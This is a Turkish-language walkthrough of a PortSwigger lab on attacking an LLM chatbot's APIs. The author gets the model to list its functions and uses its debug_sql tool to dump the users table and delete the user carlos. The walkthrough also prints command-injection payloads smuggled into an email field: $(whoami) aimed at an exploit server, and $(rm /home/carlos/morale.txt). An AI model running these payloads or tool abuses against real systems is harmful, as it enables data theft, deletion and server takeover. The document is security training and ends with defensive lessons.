# Lab 2 — Exploiting Vulnerabilities in LLM APIs

**Seviye:** Practitioner
**Zafiyet:** SQL Injection (çözüm) + OS Command Injection denemesi (RCE doğrulandı)
**Hedef:** carlos'un home dizinindeki `/home/carlos/morale.txt` dosyasını silmek

Labı SQL yoluyla çözdüm. Ayrıca command injection yüzeyini de araştırdım ve RCE'nin mümkün olduğunu kanıtladım, ancak o yolu sonuca ulaştıramadım. İkisini de aşağıda belgeledim.

---

## Keşif — Hangi Fonksiyonlar Var?

LLM'e eriştiği fonksiyonları sordum: `password_reset`, `subscribe_to_newsletter`, `product_info`. Bazı oturumlarda ayrıca `debug_sql` fonksiyonunu da bildirdi.

![Fonksiyon keşfi](lab2ss%20son.png)
*Fonksiyon keşfi — LLM'in eriştiği fonksiyonları listelemesi.*

---

## Çözüm — SQL Injection (debug_sql)

Bir oturumda LLM `debug_sql` fonksiyonuna erişimi olduğunu ve ham SQL çalıştırabildiğini bildirdi. Veritabanını sorgulayıp carlos'u sildim:

```sql
SELECT * FROM users
```

Bu, carlos'un kullanıcı adını, şifresini ve e-postasını döndürdü. Ardından:

```sql
DELETE FROM users WHERE username = 'carlos'
```

LLM "carlos has been successfully deleted" yanıtını verdi — lab çözüldü.

`debug_sql` ile `SELECT * FROM users` → carlos'un bilgileri → `DELETE` ile silme.

![debug_sql ile carlos'u silme](portswiger%20lab2ss1.png)

---

## Ek Araştırma — OS Command Injection (RCE Doğrulandı, Tamamlanmadı)

Hedef bir dosya silmek olduğu için, arka planda sistem komutu çalıştıran bir fonksiyon da aradım. `subscribe_to_newsletter` iyi bir aday çünkü e-posta gönderimi bazen OS komutu tetikler.

### RCE Doğrulaması

Kör (blind) injection olduğu için exploit server adresiyle test ettim:

```
$(whoami)@exploit-<id>.exploit-server.net
```

Email client'ta gelen mail `customer@exploit-...` adresine gelmişti — yani `$(whoami)` komutu çalışmış ve kullanıcı adını döndürmüştü. Bu, RCE'nin mümkün olduğunu kanıtladı.

![RCE kanıtı - whoami](portswiger%20lab2ss2.png)
*`$(whoami)` payload'ı ve mailin `customer@` adresine gelmesi (RCE kanıtı).*

### Dosya Silme Denemesi

Ardından `$(rm /home/carlos/morale.txt)` denedim, ancak sistem bu adresi "invalid" olarak reddetti ve oturum bir noktada disconnect oldu. Bu yolu sonuca ulaştıramadım.

![rm denemesi - invalid email](portswiger%20lab2ss3.png)
*`$(rm ...)` denemesi ve "invalid email" yanıtı.*

> **Not:** LLM'in davranışı oturumdan oturuma değişti — bazı oturumlarda `debug_sql`'i sundu, bazılarında reddetti. Bu, canlı LLM'lerin öngörülemez doğasının iyi bir örneği.

---

## Neden Çalıştı

`debug_sql`, kullanıcı girdisini doğrudan veritabanına ham SQL olarak geçiriyordu — hiçbir yetki kontrolü ya da sanitizasyon yoktu. Command injection tarafında ise girdi bir OS komutuna yerleştiriliyordu; `$(whoami)`'nin çalışması bunu doğruladı.

---

## Sonuç

- LLM'in çağırdığı API'lara gelen girdiyi mutlaka sanitize et
- Kullanıcı girdisini asla doğrudan komut/sorgu içine koyma
- `debug_sql` gibi ham veritabanı erişimini bir chatbot'a hiç verme
- LLM'e verilen her fonksiyonu ayrı bir saldırı yüzeyi olarak değerlendir
